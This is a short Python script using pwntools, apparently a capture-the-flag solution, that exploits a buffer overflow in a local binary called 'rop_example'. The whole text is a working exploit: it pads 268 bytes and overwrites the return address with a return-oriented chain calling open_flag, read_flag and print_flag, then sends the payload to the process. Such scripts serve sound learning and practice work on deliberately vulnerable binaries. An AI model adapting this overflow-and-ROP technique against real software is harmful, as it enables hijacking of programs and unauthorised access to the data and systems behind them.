from pwn import *
exe = context.binary = ELF('rop_example')
io = exe.process()
offset = 268
addr1 = exe.symbols['open_flag']
addr2 = exe.symbols['read_flag']
addr3 = exe.symbols['print_flag']

payload = fit({
    offset: addr1,
    offset+4: addr2,
    offset+8: addr3
})

io.sendline(payload)
io.recvline()